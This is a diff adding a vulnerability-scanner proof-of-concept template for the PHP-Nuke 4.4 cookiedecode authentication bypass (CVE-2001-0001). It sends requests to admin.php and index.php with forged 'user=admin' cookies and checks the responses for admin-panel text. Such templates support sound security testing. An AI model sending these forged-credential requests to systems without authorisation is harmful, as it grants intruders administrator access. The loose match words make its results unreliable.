@@ -1,0 +1,53 @@
+[info]
+author = "AVE"
+description = "PHP-Nuke 4.4 的 cookiedecode 函数未正确验证 Cookie 中的认证信息，攻击者可通过构造恶意 Cookie 绕过登录验证，直接获取管理员权限。发送包含伪造 user Cookie 的 HTTP 请求，若响应包含管理面板特征字符串则判定存在漏洞。"
+id = "POC-AVE-2001-0569"
+name = "PHP-Nuke 4.4 cookiedecode 认证绕过 PoC"
+severity = "high"
+tags = ["ave-2001-0569"]
+vuln_id = [
+    "CVE-2001-0001",
+    "AVE-2001-0569",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/admin.php"
+protocol = "http"
+
+[poc.requests.headers]
+Cookie = "user=admin&pwd=admin"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Administration",
+    "admin/index",
+    "Modules",
+    "Your Account",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/index.php"
+protocol = "http"
+
+[poc.requests.headers]
+Cookie = "user=admin"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Your Account",
+    "Logout",
+    "Administration",
+]
